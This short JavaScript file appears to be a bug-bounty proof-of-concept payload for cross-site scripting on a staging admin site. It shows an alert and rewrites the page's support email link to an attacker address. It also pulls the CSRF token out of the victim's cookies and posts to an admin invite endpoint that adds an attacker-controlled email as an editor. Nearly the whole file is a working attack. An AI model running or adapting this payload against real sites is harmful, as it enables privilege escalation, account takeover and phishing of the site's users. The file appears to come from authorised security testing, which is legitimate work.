alert("Hello from Javascript for domain "+document.domain);
document.getElementById('support_email').href="mailto:badguy@badguy.com";


let url = "https://adminbc.tsec-stg.com/api/v1/admins/send-invite";
let headers = {
    'Accept': 'application/json',
    'Content-Type': 'application/json',
    'X-Ts-Csrf': document.cookie.substring(11)
};

jsonObj={"email":"gtrf+badguy@bugcrowdninja.com", "role":"editor"}

async function makePostRequest(url, requestType, headers){
    await fetch(
        url,
        {
            method: requestType,
            headers: headers,
            body: JSON.stringify(jsonObj)
        },
    ).then(async rawResponse =>{
        var content = await rawResponse.json()
        console.log(content);
    });
}

makePostRequest(url, "POST", headers);
